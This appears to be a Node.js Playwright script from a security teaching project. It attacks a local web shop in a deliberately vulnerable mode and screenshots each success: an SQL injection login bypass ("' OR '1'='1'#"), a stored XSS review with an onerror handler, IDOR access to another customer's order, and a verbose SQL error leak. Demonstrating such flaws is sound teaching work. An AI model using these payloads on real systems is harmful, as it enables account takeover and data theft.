'use strict';

/**
 * Prints dos ATAQUES com sucesso no MODO VULNERÁVEL.
 *   node scripts/vuln-prints.js
 */
const path = require('path');
const fs = require('fs');
const { chromium } = require('playwright');

const BASE = 'http://localhost:3000';
const OUT = path.join(__dirname, '..', 'prints');
fs.mkdirSync(OUT, { recursive: true });
const shot = (p, n) => p.screenshot({ path: path.join(OUT, n), fullPage: true }).then(() => console.log('print: prints/' + n));

async function login(page, email, senha) {
  await page.goto(BASE + '/login', { waitUntil: 'networkidle' });
  await page.fill('input[name=email]', email);
  await page.fill('input[name=senha]', senha);
  await Promise.all([page.waitForNavigation().catch(() => {}), page.click('button[type=submit]')]);
  await page.waitForLoadState('networkidle');
}

(async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 860 }, ignoreHTTPSErrors: true });
  const page = await ctx.newPage();

  // ---- ATAQUE 1: SQL Injection no login (bypass) ----
  await page.goto(BASE + '/login', { waitUntil: 'networkidle' });
  // Atacante ignora a validação de frontend (como faria no Burp/curl).
  await page.evaluate(() => {
    const f = document.querySelector('form'); if (f) f.noValidate = true;
    const e = document.querySelector('input[name=email]'); if (e) e.setAttribute('type', 'text');
  });
  await page.fill('input[name=email]', "' OR '1'='1'#");
  await page.fill('input[name=senha]', 'senha_qualquer');
  await shot(page, '15-ataque-sqli-login-payload.png');
  await Promise.all([page.waitForNavigation().catch(() => {}), page.click('button[type=submit]')]);
  await page.goto(BASE + '/conta', { waitUntil: 'networkidle' });
  await shot(page, '16-ataque-sqli-logado-como-admin.png');

  // ---- ATAQUE 2: XSS armazenado numa avaliação ----
  await page.goto(BASE + '/produto/1', { waitUntil: 'networkidle' });
  const payload = '<div style="background:red;color:#fff;padding:12px 16px;font-size:20px;font-weight:bold;border-radius:6px">&#9888; XSS EXECUTADO por TutisTutis &mdash; document.cookie acessivel pelo atacante</div><img src=x onerror="document.title=\'XSS!\'">';
  await page.fill('textarea[name=comentario]', payload);
  await Promise.all([page.waitForLoadState('networkidle'), page.click('button:has-text("Enviar avaliação")')]);
  await page.goto(BASE + '/produto/1', { waitUntil: 'networkidle' });
  await shot(page, '17-ataque-xss-armazenado.png');

  // ---- ATAQUE 3: IDOR (usuário comum acessa pedido da Maria) ----
  // Loga como Carlos (cliente) via SQLi direcionada à conta dele, pois com
  // VULN_SQL_INJECTION ligado o login normal usa a query vulnerável.
  const ctx2 = await browser.newContext({ viewport: { width: 1280, height: 860 }, ignoreHTTPSErrors: true });
  const pc = await ctx2.newPage();
  await pc.goto(BASE + '/login', { waitUntil: 'networkidle' });
  await pc.evaluate(() => {
    const f = document.querySelector('form'); if (f) f.noValidate = true;
    const e = document.querySelector('input[name=email]'); if (e) e.setAttribute('type', 'text');
  });
  await pc.fill('input[name=email]', "carlos@email.com'#");
  await pc.fill('input[name=senha]', 'x');
  await Promise.all([pc.waitForNavigation().catch(() => {}), pc.click('button[type=submit]')]);
  await pc.waitForLoadState('networkidle');
  await pc.goto(BASE + '/pedidos/1', { waitUntil: 'networkidle' });
  await shot(pc, '18-ataque-idor-pedido-alheio.png');

  // ---- ATAQUE 4: erro verboso vazando SQL/stack ----
  await page.goto(BASE + "/?q=' ", { waitUntil: 'networkidle' });
  await shot(page, '19-ataque-erro-verboso-vaza-sql.png');

  await browser.close();
})().catch(e => { console.error(e); process.exit(1); });
